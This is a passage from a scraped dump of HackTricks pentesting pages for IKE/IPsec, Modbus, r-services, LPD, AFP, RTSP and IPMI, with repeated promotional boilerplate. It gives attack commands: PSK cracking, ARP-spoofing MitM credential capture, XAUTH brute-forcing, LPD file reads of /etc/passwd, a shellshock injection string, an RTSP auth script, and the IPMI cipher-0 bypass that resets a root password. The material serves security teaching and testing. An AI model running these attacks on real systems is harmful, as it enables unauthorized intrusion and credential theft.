saved inside\nhash.txt\n.\nYou can use\npsk-crack\n,\njohn\n(using\nikescan2john.py\n) and\nhashcat\nto\ncrack\nthe hash:\npsk-crack\n-d\n<\nWordlist_path\n>\npsk.txt\nXAuth\nMost implementations use\naggressive mode IKE with a PSK to perform group authentication\n, and\nXAUTH to provide additional user authentication\n(via Microsoft Active Directory, RADIUS, or similar). Within\nIKEv2\n,\nEAP replaces XAUTH\nto authenticate users.\nLocal network MitM to capture credentials\nSo you can capture the data of the login using\nfiked\nand see if there is any default username (You need to redirect IKE traffic to\nfiked\nfor sniffing, which can be done with the help of ARP spoofing,\nmore info\n). Fiked will act as a VPN endpoint and will capture the XAuth credentials:\nfiked\n-g\n<\nIP\n>\n-k\ntestgroup:secretkey\n-l\noutput.txt\n-d\nAlso, using IPSec try to make a MitM attack and block all traffic to port 500, if the IPSec tunnel cannot be established maybe the traffic will be sent in clear.\nBrute-forcing XAUTH username ad password with ikeforce\nTo brute force the\nXAUTH\n(when you know a valid group name\nid\nand the\npsk\n) you can use a username or list of usernames and a list o passwords:\n./ikeforce.py\n<\nIP\n>\n-b\n-i\n<\ngroup_id\n>\n-u\n<\nusername\n>\n-k\n<\nPSK\n>\n-w\n<\npasswords.txt\n>\n[\n-s\n1\n]\nThis way, ikeforce will try to connect using each combination of username:password.\nIf you found one or several valid transforms just use them like in the previous steps.\nAuthentication with an IPSEC VPN\nIn Kali\nVPNC\nis used to establish IPsec tunnels.\nProfiles\nhave to be located in\n/etc/vpnc/\nand you can use the tool\nvpnc\nto call them.\nExample taken from the book\nNetwork Security Assessment 3rd Edition\n:\nroot@kali:~# cat > /etc/vpnc/vpntest.conf << STOP\nIPSec gateway 10.0.0.250\nIPSec ID vpntest\nIPSec secret groupsecret123\nIKE Authmode psk\nXauth username chris\nXauth password tiffers1\nSTOP\nroot@kali:~# vpnc vpntest\nVPNC started in background (pid: 6980)...\nroot@kali:~# ifconfig tun0\nReference Material\n‚Äã\nPSK cracking paper\n‚Äã\n‚Äã\nSecurityFocus Infocus\n‚Äã\n‚Äã\nScanning a VPN Implementation\n‚Äã\nShodan\nport:500 IKE\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n389, 636, 3268, 3269 - Pentesting LDAP\nNext\n- Network Services Pentesting\n502 - Pentesting Modbus\nLast modified\n2mo ago"
    },
    {
        "title": "502 - Pentesting Modbus",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-modbus",
        "text": "502 - Pentesting Modbus\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nModbus Protocol is a messaging structure developed by Modicon in 1979. It is used to establish master-slave/client-server communication between intelligent devices.\nDefault port:\n502\nPORT    STATE SERVICE\n502/tcp open  modbus\nEnumeration\nnmap\n--script\nmodbus-discover\n-p\n502\n<\nIP\n>\nmsf\n>\nuse auxiliary/scanner/scada/modbusdetect\nmsf\n>\nuse auxiliary/scanner/scada/modbus_findunitid\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n500/udp - Pentesting IPsec/IKE VPN\nNext\n- Network Services Pentesting\n512 - Pentesting Rexec\nLast modified\n6mo ago"
    },
    {
        "title": "512 - Pentesting Rexec",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/512-pentesting-rexec",
        "text": "512 - Pentesting Rexec\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nIt is a service that\nallows you to execute a command inside a host\nif you know valid\ncredentials\n(username and password).\nDefault Port:\n512\nPORT    STATE SERVICE\n512/tcp open  exec\n‚Äã\nBrute-force\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n502 - Pentesting Modbus\nNext\n- Network Services Pentesting\n513 - Pentesting Rlogin\nLast modified\n6mo ago"
    },
    {
        "title": "513 - Pentesting Rlogin",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-rlogin",
        "text": "513 - Pentesting Rlogin\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nThis service was mostly used in the old days for remote administration but now because of security issues this service has been replaced by the slogin and the ssh.\nDefault port:\n513\nPORT    STATE SERVICE\n513/tcp open  login\nLogin\napt-get install rsh-client\nThis command will try to\nlogin\nto the remote host by using the login name\nroot\n(for this service\nyou don't need to know any password\n):\nrlogin <IP> -l <username>\n‚Äã\nBrute force\n‚Äã\nFind files\nfind / -name .rhosts\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n512 - Pentesting Rexec\nNext\n- Network Services Pentesting\n514 - Pentesting Rsh\nLast modified\n6mo ago"
    },
    {
        "title": "514 - Pentesting Rsh",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-rsh",
        "text": "514 - Pentesting Rsh\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nRsh\nuse\n.rhosts\nfiles and\n/etc/hosts.equiv\nfor authentication. These methods relied on IP addresses and DNS (Domain Name System) for authentication. However, spoofing IP addresses is fairly easy, especially if the attacker is on the local network.\nFurthermore, the\n.rhosts\nfiles were stored in users' home directories, which were typically stored on NFS (Network File System) volumes. (from here:\nhttps://www.ssh.com/ssh/rsh\n).\nDefault port\n: 514\nLogin\nrsh <IP> <Command>\nrsh <IP> -l domain\\user <Command>\nrsh domain/user@<IP> <Command>\nrsh domain\\\\user@<IP> <Command>\n‚Äã\nBrute Force\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n513 - Pentesting Rlogin\nNext\n- Network Services Pentesting\n515 - Pentesting Line Printer Daemon (LPD)\nLast modified\n6mo ago"
    },
    {
        "title": "515 - Pentesting Line Printer Daemon (LPD)",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/515-pentesting-line-printer-daemon-lpd",
        "text": "515 - Pentesting Line Printer Daemon (LPD)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nThe Line Printer Daemon (LPD) protocol had originally been introduced in Berkeley Unix in the 80s (later specified by RFC1179).\nThe daemon runs on port 515/tcp and can be accessed using the\nlpr\ncommand. To print, the client sends a\ncontrol file\ndefining job/username and a\ndata file\ncontaining the actual data to be printed. The\ninput type\nof the data file can be set in the control file by choosing among\nvarious file formats\n. However it is up to the LPD implementation how to actually handle the print data. A popular LPD implementation for Unix-like operating system is LPRng. LPD can be used as a carrier to deploy\nmalicious PostScript\nor\nPJL print jobs\n.\nThe\nlpdprint\nand\nlpdtest\ntools are included in\nPRET\n.\nThey are a minimalist way to print data directly to an LPD capable printer or download/upload/delete files and more:\nlpdprint.py hostname filename\nlpdtest.py hostname get /etc/passwd\nlpdtest.py hostname put ../../etc/passwd\nlpdtest.py hostname rm /some/file/on/printer\nlpdtest.py hostname in '() {:;}; ping -c1 1.2.3.4'\nlpdtest.py hostname mail\n[email¬†protected]\nIf you want to learn more about\nhacking printers read this page\n.\nShodan\nport 515\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n514 - Pentesting Rsh\nNext\n- Network Services Pentesting\n548 - Pentesting Apple Filing Protocol (AFP)\nLast modified\n6mo ago"
    },
    {
        "title": "548 - Pentesting Apple Filing Protocol (AFP)",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/584-pentesting-afp",
        "text": "548 - Pentesting Apple Filing Protocol (AFP)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nThe\nApple Filing Protocol\n(\nAFP\n), formerly AppleTalk Filing Protocol, is a proprietary network protocol, and part of the\nApple File Service\n(\nAFS\n), that offers file services for macOS and the classic Mac OS. In macOS, AFP is one of several file services supported**.** AFP currently supports Unicode file names, POSIX and access control list permissions, resource forks, named extended attributes, and advanced file locking. In Mac OS 9 and earlier, AFP was the primary protocol for file services.\nDefault port:\n548\nPORT    STATE SERVICE\n548/tcp open  afp\nEnumeration\nmsf\n>\nuse auxiliary/scanner/afp/afp_server_info\nnmap\n-sV\n--script\n\"afp-* and not dos and not brute\"\n-p\n<\nPORT\n>\n<\nIP\n>\nName\nDescription\nafp-ls\nLists available AFP volumes and files\nafp-path-vuln\nLists all AFP volumes and files\na\n‚Äã\nafp-serverinfo\nDisplays AFP server information\nafp-showmount\nLists available AFP shares and respective ACLs\n‚Äã\nBrute Force\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n515 - Pentesting Line Printer Daemon (LPD)\nNext\n- Network Services Pentesting\n554,8554 - Pentesting RTSP\nLast modified\n6mo ago"
    },
    {
        "title": "554,8554 - Pentesting RTSP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/554-8554-pentesting-rtsp",
        "text": "554,8554 - Pentesting RTSP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n\u0000‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nThe\nReal Time Streaming Protocol\n(\nRTSP\n) is a network control protocol designed for use in entertainment and communications systems to control streaming media servers. The protocol is used for establishing and controlling media sessions between end points. Clients of media servers issue VHS-style commands, such as play, record and pause, to facilitate real-time control of the media streaming from the server to a client (Video On Demand) or from a client to the server (Voice Recording).\nThe transmission of streaming data itself is not a task of RTSP. Most RTSP servers use the Real-time Transport Protocol (RTP) in conjunction with Real-time Control Protocol (RTCP) for media stream delivery. However, some vendors implement proprietary transport protocols. The RTSP server software from RealNetworks, for example, also used RealNetworks' proprietary Real Data Transport (RDT).\nFrom\nwikipedia\n.\nDefault ports:\n554,8554\nPORT    STATE SERVICE\n554/tcp open  rtsp\nDetailed Information\nFirst and foremost RTSP is an HTTP like protocol. It has different structure and control commands but is textual in its format and once you learn the basics of the commands and how they interact, fairly easy to use. The specification for RTSP is pretty straightforward. Here is a link to it:\n‚Äã\nRTSP ‚Äì RFC2326\n‚Äã\nRTSP can be accessed unauthenticated (common in off-the-shelf devices) or authenticated. Authenticated access mirrors HTTP in that you have Basic and Digest authentication, both nearly identical to HTTP. To find out whether your device is authenticated or unauthenticated, simply send a ‚ÄúDESCRIBE‚Äù request. A simple DESCRIBE request looks like:\nDESCRIBE rtsp://<ip>:<port> RTSP/1.0\\r\\nCSeq: 2\\r\\n\\r\nNote: the additional ‚Äú\\r\\n‚Äù is required for reliable response. Some systems will accept the single ‚Äú\\r\\n‚Äù but most won‚Äôt.\nThis can be sent down a raw socket. Just like HTTP, a successful response indicating unauthenticated access is available will contain a ‚Äú200 OK‚Äù. In this case with DESCRIBE, it will also contain all of the operational parameters of the video feed.\nIf the device requires authentication, the the response back will contain ‚Äú401 Unauthorized‚Äù. The response will also indicate what authentication mechanisms are available. If Basic authentication is available the response string will contain an information line that has ‚ÄúWWW-Authenticate: Basic‚Äù. The rest of the information provide with Basic authentication is largely irrelevant to actually conduct basic authentication.\nIf Digest authentication is required, then the ‚Äú401 Unauthorized‚Äù response will have an information line containing ‚ÄúWWW-Authenticate: Digest‚Äù. The information with the Digest specification IS very important if you are going to do Digest authentication, so don‚Äôt ignore it.\nBasic authentication is the way to go, hopefully the response received indicates that it is available. If not there are three different methods to assemble a Digest authentication element, so Digest can become troublesome, especially blind (unauthenticated). The rest of this article will stick with Basic authentication. I may write a follow-up article later once I decipher the secret sauce to doing Digest authentication blind.\nTo formulate a Basic authentication element, one simple has to base 64 encode <username> ‚Äú:‚Äù <password> and add it to the request. So a new request would look like:\nDESCRIBE rtsp://<ip>:<port> RTSP/1.0\\r\\nCSeq: 2\\r\\nAuthorization: Basic YWRtaW46MTIzNA==\\r\\n\\r\nAgain note the request is terminated with the double ‚Äú\\r\\n‚Äù.\nThe value YWRtaW46MTIzNA== is the base 64 encoded username and password concatenated with ‚Äú:‚Äù. In this case I have used ‚Äúadmin‚Äù/‚Äù1234‚Äù. Some simple python scripting to try this out looks like:\nimport\nsocket\nreq\n=\n\"DESCRIBE rtsp://<ip>:<port> RTSP/1.0\\r\\nCSeq: 2\\r\\nAuthorization: Basic YWRtaW46MTIzNA==\\r\\n\\r\\n\"\ns\n=\nsocket\n.\nsocket\n(\nsocket\n.\nAF_INET\n,\nsocket\n.\nSOCK_STREAM\n)\ns\n.\nconnect\n((\n\"192.168.1.1\"\n,\n554\n))\ns\n.\nsendall\n(\nreq\n)\ndata\n=\ns\n.\nrecv\n(\n1024\n)\nprint\n(\ndata\n)\nVoila! You have access.\nFrom:\nhttp://badguyfu.net/rtsp-brute-forcing-for-fun-and-naked-pictures/\n‚Äã\nEnumeration\nLets get information about valid methods and URLs are supported and try to brute-force the access (if needed) to get access to the content.\nnmap\n-sV\n--script\n\"rtsp-*\"\n-p\n<\nPORT\n>\n<\nIP\n>\n‚Äã\nBrute Force\n‚Äã\nOther useful programs\nTo bruteforce:\nhttps://github.com/Tek-Security-Group/rtsp_authgrinder\n‚Äã\nCameradar\nCameradar allows you to:\nDetect open RTSP hosts on any accessible target\nGet their public info (hostname, port, camera model, etc.)\nLaunch automated dictionary attacks to get their stream route (for example /live.sdp)\nLaunch automated dictionary attacks to get the username and password of the cameras\nGenerate thumbnails from them to check if the streams are valid and to have a quick preview of their content\nTry to create a Gstreamer pipeline to check if they are properly encoded\nPrint a summary of all the informations Cameradar could get\n‚Äã\nhttps://github.com/Ullaakut/cameradar\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n548 - Pentesting Apple Filing Protocol (AFP)\nNext\n- Network Services Pentesting\n623/UDP/TCP - IPMI\nLast modified\n6mo ago"
    },
    {
        "title": "623/UDP/TCP - IPMI",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi",
        "text": "623/UDP/TCP - IPMI\n623/UDP/TCP - IPMI\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\n‚Äã\nIntelligent Platform Management Interface\n(\nIPMI\n) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. IPMI is typically used in three ways:\nBefore the OS has booted to modify BIOS settings\nWhen the host is fully powered down\nAccess to a host after a system failure\nWhen not being used for these tasks, IPMI can monitor a range of different things such as system temperature, voltage, fan status, and power supplies. It can also be used for querying inventory information, reviewing hardware logs, and alerting using SNMP. The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.\nThe IPMI protocol was first published by Intel in 1998 and is now supported by over 200 system vendors, including Cisco, Dell, HP, Supermicro, Intel, and more. Systems using IPMI version 2.0 can be administered via serial over LAN, giving sysadmins the ability to view serial console output in band. To function, IPMI requires the following components:\nBaseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI\nIntelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another\nIntelligent Platform Management Bus (IPMB) - extends the BMC\nIPMI Memory - stores things such as the system event log, repository store data, and more\nCommunications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus\nDefault Port\n: 623/UDP/TCP (It's usually on UDP but it could also be running on TCP)\nEnumeration\nDiscovery\nnmap\n-n\n-p\n623\n10.0\n.0./24\nnmap -n-sU\n-p\n623\n10.0\n.0./24\nuse  auxiliary/scanner/ipmi/ipmi_version\nYou can\nidentify\nthe\nversion\nusing:\nuse auxiliary/scanner/ipmi/ipmi_version\nnmap\n-sU\n--script\nipmi-version\n-p\n623\n10.10\n.10.10\nVulnerability - IPMI Authentication Bypass via Cipher 0\nDan Farmer\nidentified a serious failing\nof the IPMI 2.0 specification, namely that cipher type 0, an indicator that the client wants to use clear-text authentication, actually\nallows access with any password\n. Cipher 0 issues were identified in HP, Dell, and Supermicro BMCs, with the issue likely encompassing all IPMI 2.0 implementations.\nNote that to exploit this issue you first need to\nfind a valid user\n.\nYou can\nidentify\nthis issue using:\nuse auxiliary/scanner/ipmi/ipmi_cipher_zero\nAnd you can\nabuse\nthis issue with\nipmitool\n:\napt-get\ninstall\nipmitool\n#Install\n#Using -C 0 any password is accepted\nipmitool\n-I\nlanplus\n-C\n0\n-H\n10.0\n.0.22\n-U\nroot\n-P\nroot user list\n#Use Cipher 0 to dump a list of users\nID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit\n2\nroot\ntrue\ntrue\ntrue\nADMINISTRATOR\n3\nOper1\ntrue\ntrue\ntrue\nADMINISTRATOR\nipmitool\n-I\nlanplus\n-C\n0\n-H\n10.0\n.0.22\n-U\nroot\n-P\nroot user\nset\npassword\n2\nabc123\n#Change the password of root\nVulnerability - IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval\nBasically,\nyou can ask the server for the a salted hashed MD5 and SHA1 of any username and if the username exists those hashes will be sent back.\nYeah, as amazing as it sounds. And there is a\nmetasploit module\nfor testing this (you can select the output in John or Hashcat format):\nmsf\n>\nuse auxiliary/scanner/ipmi/ipmi_dumphashes\nNote that for this you only need a list of usernames to brute-force (metasploit already contains one with default usernames).\nUsing\nipmitool\nbypassing authentication (\n-c 0\n) to change the root password to abc123:\nroot@kali:~# apt-get install ipmitool\nroot@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list\nID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit\n2   root             true    true       true       ADMINISTRATOR\n3   Oper1            true    true       true       ADMINISTRATOR\nroot@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123\nVulnerability - IPMI Anonymous Authentication\nIn addition to the authentication problems above, Dan Farmer noted that\nmany BMCs ship with \"anonymous\" access enabled by default\n. This is configured by setting the username of the first\nuser\naccount to a\nnull string\nand\nsetting\na\nnull password\nto 